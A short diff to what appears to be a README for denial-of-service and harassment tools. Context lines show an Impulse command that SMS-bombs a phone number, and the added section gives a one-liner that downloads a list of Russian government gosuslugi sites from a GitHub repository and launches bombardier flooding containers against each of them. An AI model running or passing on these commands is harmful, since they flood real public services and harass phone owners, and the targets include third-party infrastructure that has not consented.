@@ -54,3 +54,11 @@ https://github.com/LimerBoy/Impulse
 cd LimerBoy-Impulse
 python3 impulse.py --method SMS --time 20 --threads 15 --target +380123456789
 ```
+
+# Automated bombardier
+
+to spawn several `bombardier`'s in isolated docker containers:
+
+```shell
+tools/bombarder.sh $(curl -s https://raw.githubusercontent.com/UA-IT-Army/aggressor-sites/main/ru/ru_gosuslugi.json | jq -r '. | keys[]')
+```
